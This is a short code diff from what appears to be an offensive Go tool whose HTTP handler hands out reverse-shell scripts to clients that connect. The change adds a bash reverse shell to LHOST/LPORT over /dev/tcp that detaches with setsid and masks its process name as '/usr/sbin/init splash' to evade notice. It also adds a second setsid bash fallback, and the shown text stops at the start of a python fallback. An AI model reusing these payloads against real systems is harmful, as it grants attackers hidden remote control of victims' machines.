@@ -14,7 +14,11 @@ var lport string
 func root(w http.ResponseWriter, req *http.Request) {
 	fmt.Println("[+] new connection from:", req.RemoteAddr)
 	shells := `if command -v bash > /dev/null 2>&1; then
-	bash -c 'nohup bash -i &>/dev/tcp/LHOST/LPORT 0>&1 &'
+	setsid /bin/bash -c "exec -a '/usr/sbin/init splash' /bin/bash &>/dev/tcp/LHOST/LPORT 0>&1 &"
+	exit;
+fi
+if command -v bash > /dev/null 2>&1; then
+	bash -c 'setsid bash -i &>/dev/tcp/LHOST/LPORT 0>&1 &'
 	exit;
 fi
 if command -v python > /dev/null 2>&1; then
